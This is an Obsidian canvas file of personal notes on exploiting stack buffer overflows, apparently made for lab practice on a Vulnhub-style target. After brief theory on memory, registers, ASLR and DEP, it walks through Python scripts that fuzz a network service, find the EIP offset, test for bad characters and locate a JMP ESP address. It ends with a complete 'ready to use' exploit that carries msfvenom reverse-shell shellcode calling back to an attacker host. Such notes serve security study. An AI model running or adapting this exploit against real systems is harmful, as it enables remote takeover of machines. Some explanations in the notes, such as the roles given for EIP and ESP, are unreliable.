{
	"nodes":[
		{"id":"b401ef0e99a94dac","type":"text","text":"# Exploiting Buffer Overflows\nBOF explained: https://www.youtube.com/watch?v=6sUd3AA7Q50\n\nWhy `JMP ESP`: https://security.stackexchange.com/questions/157478/why-jmp-esp-instead-of-directly-jumping-into-the-stack\n\n|                                                                                                                                                                                                                   Memory                                                                                                                                                                                                                   |                                                                                                                                                                                                           Stack                                                                                                                                                                                                           |                                                                                                                                                                                                                         BOF                                                                                                                                                                                                                         |\n| :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |\n|                                                                                                                                                                                                    ![[Pasted image 20240307083721.png]]                                                                                                                                                                                                    |                                                                                                                                                                                           ![[Pasted image 20240307090405.png]]                                                                                                                                                                                            |                                                                                                                                                                                                        ![[Pasted image 20240307092706.png]]                                                                                                                                                                                                         |\n|                                                                                                                                                                              0. Memory with program<br>Kernel - space (not accesible from userspace)<br><br>                                                                                                                                                                               |                                                                                                                                      1. Overwriting buffer (from lower address to upper address)<br><br>Stack contain frames, each frame corresponds to unterminated procedure.<br>                                                                                                                                       |                                                                                                                                                                 <br>2. Overwriting Base Pointer (EBP)<br>3. Overwriting Return (EIP) to memory address with NOP sleed and shellcode                                                                                                                                                                 |\n| **Kernel space** - kernel functionality not accesible from userspace (all bellow)<br>**Stack** - local variables and parameters<br>**Memory Mapping** - File mappings including dynamic libraries, shared libs.<br>**Heap** - dynamicaly allocated variables<br>**BSS** - Uninitialised global and static variables (declared but without value)<br>**Data** - Initialised global and static variables<br>**Text** - Process binary images | **Function** - som area of code that does sth and returns back<br><br>**Parameters** - variables declared in function/procedure<br>**Return** - Return address (popped to EIP register) after compleeting function, direct code execution on function completion<br>**Base Pointer** - stored when frame is added (reference pointer in previous function)<br>**Buffer** - parameters  that function has been called with | ESP indicates the beginning of the BUFFER. After overwriting the BUFFER and further memory, the content of the RETURN field changes (not EIP), the function ends and the content of RETURN is written to EIP. The program jumps to the place indicated by EIP (there may be shell code there). <br><br>EIP can also point to a fragment of memory containing the `JMP ESP` instruction (beginning of the buffer, contains shell code) (ASLR bypass) |\nProblems:\n1. Locate the EIP Address offset<br>Send a unique pattern of characters as a string to provocate the buffer overflow, once the string is sent, EIP will be overwritten by a unique 4-bytes pattern that could be searched in the original string to find the offset position in the string, then you could replace this part of the string with the ESP address,\n2. Finding ESP value<br>Two ways: the first one is using any Disassembler/Debugger (Ollydbg, IDAPro, Immunity, etc…) and manually attach to the process and analyze the registers at the moment of the exception, another way to do this is using a programming language like python to write a pycommand for Immunity (this solution always involve the use of a debugger, Immunity in this case) or you could use pydbg (a python debugger library) to analyze the exception and print the register values.\n3. Finding bad characters<br>the main idea behind it is to send a string formed by all the characters in Hex (from 0x00 to 0xFF) and monitor manually with a Disassembler/Debugger or programmatically using pycommands for Immunity or pydbg for python. When a bad character is sent the string sent is truncated just before the bad character revealing one of the bad characters, then you need to repeat this process eliminating each bad character found, until all the string is passed.","x":-125,"y":-360,"width":745,"height":1280},
		{"id":"71c955b60acf0c3b","type":"text","text":"# Registers\nRxx - 64-bit Registers\nExx - 32-bit Registers\n\nEIP - points to top of stack\nESP - points to base of stack\nEBX - Used as pointer to data","x":-620,"y":-360,"width":420,"height":200},
		{"id":"2fcf3326b25a7659","type":"text","text":"# ASLR (Address space layout randomization)\n\n[Address space layout randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization)\n\nBypas:\n1. Bruteforce\n2. NOP-Sled\n\n# DEP (Data Execution Prevention)\n\ncelem jest uniemożliwienie wykonywania kodu z segmentu danych. Pomaga to w ochronie przed exploitami wykorzystującymi przepełnienie bufora.\n \nhttps://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/","x":-620,"y":-140,"width":420,"height":440},
		{"id":"a6bd46252886e188","type":"text","text":"# Buzzwords to check\nASLR\nNo-Execute (NX)\nROP Chains\nStack Canaries/Cookies","x":-620,"y":420,"width":420,"height":400},
		{"id":"508c023e3035a305","type":"text","text":"# Stack-based exploitation guideline\n1. crash or overflow the program x/ \n2. find out how many bytes it took to crash the program (EIP offset) \n3. confirm the offset with an EIP ‘overwrite’ (I call this the \"B test\") \n4. either use/create some shellcode to exploit the program (inadvisable if there's NX/DEP present) or utilize a ret2*-based attack \n5. >:]","x":620,"y":-680,"width":1240,"height":320},
		{"id":"d72352b62ae8ceff","type":"text","text":"# Brainpan - Vulnhub\nWatkthrou - https://0xmohomiester.medium.com/brainpan-1-buffer-overflow-vulnhub-machine-3d885c5cac74\n\n\n\n\n\n\n","x":680,"y":-290,"width":760,"height":130},
		{"id":"d3d6ce6627219290","type":"text","text":"# BOF ","x":2160,"y":-1760,"width":955,"height":70,"color":"1"},
		{"id":"acbf7ccdf2bc0c0e","type":"text","text":"## Run program with Immunity debugger\nFire > Open > chose file > Run (F9)","x":2160,"y":-1650,"width":955,"height":95},
		{"id":"696197f2310b9298","type":"text","text":"## Fuzz for program crush\n```python\n#!/usr/bin/python\nimport sys\nimport socket\nfrom time import sleep\n  \nIP='172.30.4.17'\nPORT=2371\n\ncounter = 1\n  \nwhile (counter<5012):\n\tbuffer = \"A\"*counter\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect((IP, PORT))\n\ts.send(bytes(buffer,\"latin-1\"))\n\tprint(f\"payload len= {len(buffer)}\")\n\ts.recv(1024)\n\ts.close()\n\tcounter = counter + 100\n\tsleep(1)\n```\nPrint len of payload when program crash.","x":2160,"y":-1510,"width":955,"height":490},
		{"id":"7dd4971dcd5f5665","type":"text","text":"## which exactly four bytes overwrites EIP register\nCreate unique string and use it to overflow buffer.\n\n```bash\n$ msf-pattern_create -l 1800 # create unique string - length 600\n```\n```python\nimport sys\nimport socket\n  \nIP='172.30.4.17'\nPORT=2371\ncrash_len=1800\n  \npattern=\"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9\"\n  \n  \nbuffer = pattern\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((IP, PORT))\ns.send(bytes(buffer,\"latin-1\"))\ns.recv(1024)\ns.close()\n```\n\n**In Immunity Debugger find EIP value** (Info banner: Access Violation when executing [*EIP value*])\n\nGet offset\n```bash\n$ msf-pattern_offset -q 65433765 # EIP value when program crashed\n[*] Exact match at offset 1702\n```\n\n","x":2160,"y":-932,"width":955,"height":852},
		{"id":"65af8d979b969cbe","type":"text","text":"## B test\nCrate payload using found offset with `\"A\" * overflow_len + \"B\" * 4` (add `C` to make payload crash app - payload len 600 crash app)\n```python\nimport sys\nimport socket\n  \nIP='172.30.4.17'\nPORT=2371\ncrash_len=1800\noverflow_len=1702\n\nbuffer = \"\"\nbuffer+=\"A\" * overflow_len # overflowing buffer\nbuffer+=\"B\" * 4 # overwriting EIP\nbuffer+=\"C\" * 32 # additional padding to guarantee app crash\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((IP, PORT))\ns.send(bytes(buffer,\"latin-1\"))\ns.recv(1024)\ns.close()\n```\nEIP contain `42424242` - HEX BBBB -> we can JMP to any place in memory to execute malicious code (shellcode) to compromise the operating system.","x":2160,"y":-60,"width":955,"height":520},
		{"id":"05eb9e5d97638c3d","type":"text","text":"## generate and find bad chars\n```python\n# generate all possible chars\n\nimport sys\nfor x in range(0,256):\n\tsys.stdout.write(\"\\\\x\" + '{:02x}'.format(x))\n```\n```python\nimport sys\nimport socket\n  \nIP='172.30.4.17'\nPORT=2371\ncrash_len=1800\noverflow_len=1702\nbadchars_found=\"\\x00\" # known bad char\n\nbadchars = \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((IP, PORT))\ns.send(bytes(buffer,\"latin-1\"))\ns.recv(1024)\ns.close()\n```\nCrash program > Follow in Dump on `ESP` > find charswhere the payload is getting truncated and remove them from `badchars` and add to `badchars_found` > repeat until memory filled with all chars up to `/xFF`","x":2160,"y":469,"width":955,"height":711},
		{"id":"1f6f8156a7d802fa","type":"text","text":"## Search for JMP ESP\nlocate the module which does not have flags such as ASLR and NXCompat set\nUse [mona.py](https://raw.githubusercontent.com/corelan/mona/master/mona.py) to search for `JMP ESP` address - we need an instruction `jmp esp`, `call esp` or `push esp`\n```bash\n# in Immunity Debugger\n!mona modules # find any modules with minimum security configurations\n!mona find -s \"\\xff\\xe4\" -m login_support.dll # find JMP ESP\n```\nfound addresses: \n```python\nJMP =\"\\xB8\\x12\\x50\\x62\"\nJMP =\"\\xC5\\x12\\x50\\x62\"\n```","x":2160,"y":1220,"width":955,"height":320},
		{"id":"184f5a756dcbf6af","type":"text","text":"# ready to use BOF\n```python\nimport sys\nimport socket\n\nIP='172.30.4.17'\nPORT=2371\ncrash_len=1800\noverflow_len=1702\nJMP =\"\\xB8\\x12\\x50\\x62\"\n# JMP =\"\\xC5\\x12\\x50\\x62\"\nNOP=\"\\x90\"*32\n# shellcode $ msfvenom -p windows/shell_reverse_tcp LHOST=172.30.4.20 LPORT=1234 -b \"\\x00\\x2d\\x2e\\x46\\x47\\x59\\x5e\\x60\" -f c\nshellcode=(\n\"\\x29\\xc9\\xb1\\x51\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\"\n\"\\x94\\xf7\\xa8\\xe8\\x83\\xeb\\xfc\\xe2\\xf4\\x68\\x1f\\x2a\\xe8\\x94\"\n\"\\xf7\\xc8\\x61\\x71\\xc6\\x68\\x8c\\x1f\\xa7\\x98\\x63\\xc6\\xfb\\x23\"\n\"\\xba\\x80\\x7c\\xda\\xc0\\x9b\\x40\\xe2\\xce\\xa5\\x08\\x04\\xd4\\xf5\"\n\"\\x8b\\xaa\\xc4\\xb4\\x36\\x67\\xe5\\x95\\x30\\x4a\\x1a\\xc6\\xa0\\x23\"\n\"\\xba\\x84\\x7c\\xe2\\xd4\\x1f\\xbb\\xb9\\x90\\x77\\xbf\\xa9\\x39\\xc5\"\n\"\\x7c\\xf1\\xc8\\x95\\x24\\x23\\xa1\\x8c\\x14\\x92\\xa1\\x1f\\xc3\\x23\"\n\"\\xe9\\x42\\xc6\\x57\\x44\\x55\\x38\\xa5\\xe9\\x53\\xcf\\x48\\x9d\\x62\"\n\"\\xf4\\xd5\\x10\\xaf\\x8a\\x8c\\x9d\\x70\\xaf\\x23\\xb0\\xb0\\xf6\\x7b\"\n\"\\x8e\\x1f\\xfb\\xe3\\x63\\xcc\\xeb\\xa9\\x3b\\x1f\\xf3\\x23\\xe9\\x44\"\n\"\\x7e\\xec\\xcc\\xb0\\xac\\xf3\\x89\\xcd\\xad\\xf9\\x17\\x74\\xa8\\xf7\"\n\"\\xb2\\x1f\\xe5\\x43\\x65\\xc9\\x9f\\x9b\\xda\\x94\\xf7\\xc0\\x9f\\xe7\"\n\"\\xc5\\xf7\\xbc\\xfc\\xbb\\xdf\\xce\\x93\\x08\\x7d\\x50\\x04\\xf6\\xa8\"\n\"\\xe8\\xbd\\x33\\xfc\\xb8\\xfc\\xde\\x28\\x83\\x94\\x08\\x7d\\xb8\\xc4\"\n\"\\xa7\\xf8\\xa8\\xc4\\xb7\\xf8\\x80\\x7e\\xf8\\x77\\x08\\x6b\\x22\\x3f\"\n\"\\x82\\x91\\x9f\\x04\\xf6\\x90\\xe3\\xc0\\xea\\x94\\xf3\\x7a\\x61\\x72\"\n\"\\x9d\\xb8\\xbe\\xc3\\x9f\\x31\\x4d\\xe0\\x96\\x57\\x3d\\x11\\x37\\xdc\"\n\"\\xe4\\x6b\\xb9\\xa0\\x9d\\x78\\x9f\\x58\\x5d\\x36\\xa1\\x57\\x3d\\xfc\"\n\"\\x94\\xc5\\x8c\\x94\\x7e\\x4b\\xbf\\xc3\\xa0\\x99\\x1e\\xfe\\xe5\\xf1\"\n\"\\xbe\\x76\\x0a\\xce\\x2f\\xd0\\xd3\\x94\\xe9\\x95\\x7a\\xec\\xcc\\x84\"\n\"\\x31\\xa8\\xac\\xc0\\xa7\\xfe\\xbe\\xc2\\xb1\\xfe\\xa6\\xc2\\xa1\\xfb\"\n\"\\xbe\\xfc\\x8e\\x64\\xd7\\x12\\x08\\x7d\\x61\\x74\\xb9\\xfe\\xae\\x6b\"\n\"\\xc7\\xc0\\xe0\\x13\\xea\\xc8\\x17\\x41\\x4c\\x58\\x5d\\x36\\xa1\\xc0\"\n\"\\x4e\\x01\\x4a\\x35\\x17\\x41\\xcb\\xae\\x94\\x9e\\x77\\x53\\x08\\xe1\"\n\"\\xf2\\x13\\xaf\\x87\\x85\\xc7\\x82\\x94\\xa4\\x57\\x3d\"\n)\n  \nbuffer = \"\"\nbuffer+= \"A\" * overflow_len # overflowing buffer\nbuffer+= JMP # overwriting EIP\nbuffer+= NOP # NOP sleed\nbuffer+= shellcode\n  \ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((IP, PORT))\ns.send(bytes(buffer,\"latin-1\"))\ns.recv(1024)\ns.close()\n```","x":2160,"y":1800,"width":955,"height":960},
		{"id":"c156a355a16ace31","type":"text","text":"## create a shellcode using msfvenom\n```bash\n# the order is important\n$ msfvenom -p windows/shell_reverse_tcp  LHOST=172.30.4.20 LPORT=1234 EXITFUNC=thread -b \"\\x00\\x2d\\x2e\\x46\\x47\\x59\\x5e\\x60\" -f c\n$ msfvenom -p linux/x86/shell/reverse_tcp LHOST=172.30.4.20 LPORT=1234 EXITFUNC=thread -b \"\\x00\\x2d\\x2e\\x46\\x47\\x59\\x5e\\x60\" -f c\n```\nhttps://www.hacking-tutorial.com/tips-and-trick/what-is-metasploit-exitfunc/\n`exitfunct=thread` explained\n","x":2160,"y":1580,"width":955,"height":200}
	],
	"edges":[
		{"id":"e2a04d8a944e9871","fromNode":"d3d6ce6627219290","fromSide":"bottom","toNode":"acbf7ccdf2bc0c0e","toSide":"top"},
		{"id":"277f0ebd82e7dce1","fromNode":"acbf7ccdf2bc0c0e","fromSide":"bottom","toNode":"696197f2310b9298","toSide":"top"},
		{"id":"45fea32ced6e86f6","fromNode":"696197f2310b9298","fromSide":"bottom","toNode":"7dd4971dcd5f5665","toSide":"top"},
		{"id":"a9ee92035f75fff9","fromNode":"7dd4971dcd5f5665","fromSide":"bottom","toNode":"65af8d979b969cbe","toSide":"top"},
		{"id":"9001a21418285d4f","fromNode":"65af8d979b969cbe","fromSide":"bottom","toNode":"05eb9e5d97638c3d","toSide":"top"},
		{"id":"2c57a78ca1e1476d","fromNode":"1f6f8156a7d802fa","fromSide":"bottom","toNode":"c156a355a16ace31","toSide":"top"},
		{"id":"8d2f91dda25e855c","fromNode":"05eb9e5d97638c3d","fromSide":"bottom","toNode":"1f6f8156a7d802fa","toSide":"top"},
		{"id":"c4b25ed32255b1e9","fromNode":"c156a355a16ace31","fromSide":"bottom","toNode":"184f5a756dcbf6af","toSide":"top"}
	]
}